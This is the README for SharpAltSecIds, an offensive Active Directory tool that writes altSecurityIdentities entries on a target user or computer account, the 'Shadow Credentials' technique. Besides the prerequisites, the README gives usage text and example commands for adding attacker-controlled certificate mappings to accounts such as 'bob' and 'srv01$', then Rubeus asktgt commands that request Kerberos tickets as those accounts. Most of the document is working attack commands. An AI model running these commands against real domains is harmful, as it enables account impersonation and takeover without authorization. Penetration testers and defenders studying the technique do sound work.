# SharpAltSecIds

Shadow Credentials using altSecurityIdentities.

Prerequisite:
- Object access to a target (user or computer).
- Access to a certificate trusted by domain controllers (NTAuthCertificates not a requirement).
- Domain controllers configured to support PKINIT.

Inspiration:
- https://github.com/eladshamir/Whisker
- https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/

## Usage
```
SharpAltSecIds by @bugch3ck.

    Shadow Credentials using altSecurityIdentities.

    Inspired by the blog post "Microsoft ADCS – Abusing PKI in Active Directory Environment"
    by Jean Marsault at Wavestone.

Usage:
    SharpAltSecIds command [options]

Commands:
    l | list               - List current altSecurityIdentities entries.
    a | add                - Add altSecurityIdentities entry for target account.
    r | remove             - Remove altSecurityIdentities entry for target account.
    h | help (default)     - Show this help.

Options:
    /t /target:<account>   - The targeted account (end with $ for computer accounts).
    /a /altsecid:<value>   - The altSecurityIdentity value (X509:<I>...|X509:<SKI>...)

Examples:
    SharpAltSecIds list
    SharpAltSecIds l /target:bob
    SharpAltSecIds a /target:bob "/altsecid:X509:<I>DC=local,DC=mydomain,CN=myca<S>DC=local,DC=mydomain,CN=mycert"
    SharpAltSecIds r /target:bob "/altsecid:X509:<I>DC=local,DC=mydomain,CN=myca<S>DC=local,DC=mydomain,CN=mycert"
    SharpAltSecIds add /target:srv01$ /altsecid:X509:<SKI>4b8c70eeaadd62c88487a27c79a444ec930837f4
    SharpAltSecIds remove /target:srv01$ /altsecid:X509:<SKI>4b8c70eeaadd62c88487a27c79a444ec930837f4

Example usage with Rubeus:
    Rubeus asktgt /user:bob /certificate:mycert.pfx /password:thepassword /show /nowrap
    Rubeus asktgt /user:srv01$ /certificate:14350a8f2db76545b81a84587522cb740940f760 /show /nowrap
```
